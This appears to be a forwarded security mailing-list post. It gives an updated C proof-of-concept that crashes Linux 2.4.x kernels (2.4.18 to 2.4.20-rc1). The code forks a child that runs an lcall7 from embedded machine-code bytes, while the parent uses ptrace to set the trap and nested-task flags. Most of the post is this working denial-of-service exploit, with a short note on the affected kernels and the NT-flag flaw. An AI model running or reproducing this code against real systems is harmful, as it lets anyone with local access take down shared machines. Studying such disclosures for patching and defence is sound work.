This was posted today ;) (uff, the two-side forwarded conversation ;) )

Yep; the first version of the DoS I posted on bugtraq was defective and
worked only under special conditions (inside gdb for example).
However this updated version works much better:
#include <sys/ptrace.h>
struct user_regs_struct {
        long ebx, ecx, edx, esi, edi, ebp, eax;
        unsigned short ds, __ds, es, __es;
        unsigned short fs, __fs, gs, __gs;
        long orig_eax, eip;
        unsigned short cs, __cs;
        long eflags, esp;
        unsigned short ss, __ss;
};
int main( void )
{
    int pid;
    char dos[] = "\x9A\x00\x00\x00\x00\x07\x00";
    void (* lcall7)( void ) = (void *) dos;
    struct user_regs_struct d;
    if( ! ( pid = fork() ) )
    {
        usleep( 1000 );
        (* lcall7)();
    }
    else
    {
        ptrace( PTRACE_ATTACH, pid, 0, 0 );
        while( 1 )
        {
            wait( 0 );
            ptrace( PTRACE_GETREGS, pid, 0, &d );
            d.eflags |= 0x4100; /* set TF and NT */
            ptrace( PTRACE_SETREGS, pid, 0, &d );
            ptrace( PTRACE_SYSCALL, pid, 0, 0 );
        }
    }
    return 1;
}
At the beginning I thought only kernels <= 2.4.18 were affected; but it
appeared that both kernels 2.4.19 and 2.4.20-rc1 are vulnerable as well.
The flaw seems to be related to the kernel's handling of the nested task 
(NT) flag inside a lcall7.
